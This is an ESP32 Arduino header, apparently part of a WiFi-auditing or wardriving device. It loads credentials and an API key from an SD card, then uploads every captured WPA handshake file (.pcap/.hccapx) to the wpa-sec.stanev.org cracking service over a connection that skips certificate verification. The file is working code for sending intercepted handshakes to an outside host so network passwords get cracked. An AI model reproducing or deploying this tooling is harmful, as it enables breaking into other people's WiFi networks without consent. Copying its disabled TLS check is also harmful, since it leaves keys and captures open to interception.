#ifndef ONLINE_CRACK_H
#define ONLINE_CRACK_H

#include <Arduino.h>
#include <WiFi.h>
#include <WiFiClientSecure.h>
#include <SD_MMC.h>
#include "FS.h"

// Config loader
struct WiFiConfig {
    String ssid;
    String pass;
    String wpa_sec_key;
};

class OnlineCrack {
public:
    static WiFiConfig loadConfig() {
        WiFiConfig cfg;
        cfg.ssid = "";
        cfg.pass = "";
        cfg.wpa_sec_key = "";

        if (SD_MMC.exists("/wifi_config.txt")) {
            File f = SD_MMC.open("/wifi_config.txt");
            if (f) {
                while (f.available()) {
                    String line = f.readStringUntil('\n');
                    line.trim();
                    if (line.startsWith("SSID=")) cfg.ssid = line.substring(5);
                    else if (line.startsWith("PASS=")) cfg.pass = line.substring(5);
                    else if (line.startsWith("KEY=")) cfg.wpa_sec_key = line.substring(4);
                }
                f.close();
            }
        }
        return cfg;
    }

    static int uploadAll() {
        WiFiConfig cfg = loadConfig();

        if (cfg.ssid == "" || cfg.wpa_sec_key == "") {
            Serial.println("Erro: Configure SSID e KEY em /wifi_config.txt");
            return -1;
        }

        Serial.printf("Conectando a %s...\n", cfg.ssid.c_str());
        WiFi.begin(cfg.ssid.c_str(), cfg.pass.c_str());

        int retries = 0;
        while (WiFi.status() != WL_CONNECTED && retries < 20) {
            delay(500);
            Serial.print(".");
            retries++;
        }

        if (WiFi.status() != WL_CONNECTED) {
            Serial.println("\nFalha no WiFi");
            return -2;
        }

        Serial.println("\nWiFi Conectado! Iniciando Real Upload (wpa-sec)...");

        File root = SD_MMC.open("/upload_queue");
        if (!root) {
             root = SD_MMC.open("/handshakes"); // Fallback to handshakes folder if queue empty
        }

        File file = root.openNextFile();
        int count = 0;

        while (file) {
            if (!file.isDirectory()) {
                String filename = String(file.name());
                // Only upload .pcap or .hccapx
                if (filename.endsWith(".pcap") || filename.endsWith(".hccapx")) {
                    if (uploadFile(file, cfg.wpa_sec_key)) {
                        Serial.printf("SUCESSO: %s enviado.\n", filename.c_str());
                        // Optional: Move to /uploaded
                        // SD_MMC.rename(file.path(), "/uploaded/" + filename);
                        count++;
                    } else {
                        Serial.printf("FALHA: %s\n", filename.c_str());
                    }
                }
            }
            file = root.openNextFile();
        }

        WiFi.disconnect();
        return count;
    }

private:
    static bool uploadFile(File& file, String key) {
        WiFiClientSecure client;
        client.setInsecure(); // Skip certificate check

        if (!client.connect("wpa-sec.stanev.org", 443)) {
            Serial.println("Falha ao conectar no servidor");
            return false;
        }

        String boundary = "------------------------Esp32Boundary";
        String fileName = String(file.name());
        size_t fileSize = file.size();

        // Construct Headers & Body parts
        String head = "--" + boundary + "\r\nContent-Disposition: form-data; name=\"key\"\r\n\r\n" + key + "\r\n";
        String fileHead = "--" + boundary + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\nContent-Type: application/octet-stream\r\n\r\n";
        String tail = "\r\n--" + boundary + "--\r\n";

        size_t totalLen = head.length() + fileHead.length() + fileSize + tail.length();

        // Send Request
        client.println("POST /?api&dl=1 HTTP/1.1");
        client.println("Host: wpa-sec.stanev.org");
        client.println("Content-Type: multipart/form-data; boundary=" + boundary);
        client.print("Content-Length: "); client.println(totalLen);
        client.println("Connection: close");
        client.println();

        client.print(head);
        client.print(fileHead);

        // Stream File
        uint8_t buf[512];
        while (file.available()) {
            size_t read = file.read(buf, 512);
            client.write(buf, read);
        }

        client.print(tail);

        // Check Response
        long timeout = millis();
        while (client.connected() && !client.available()) {
            if (millis() - timeout > 10000) return false;
            delay(10);
        }

        bool success = false;
        while (client.available()) {
            String line = client.readStringUntil('\n');
            if (line.indexOf("HTTP/1.1 200") >= 0) success = true;
        }
        client.stop();

        return success;
    }
};

#endif
